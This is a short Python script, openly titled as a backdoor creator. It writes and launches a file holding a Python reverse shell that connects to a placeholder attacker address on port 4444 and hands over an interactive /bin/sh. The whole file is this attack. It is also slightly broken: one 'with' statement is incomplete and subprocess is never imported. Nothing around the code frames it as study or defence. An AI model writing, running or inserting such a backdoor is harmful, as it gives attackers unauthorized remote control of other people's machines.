import os


def create_backdoor():

    with open('backdoor.py', 'w') as 
        f.write("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('Your ip address',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);")
    
    subprocess.Popen("python backdoor.py", shell=True)

create_backdoor()
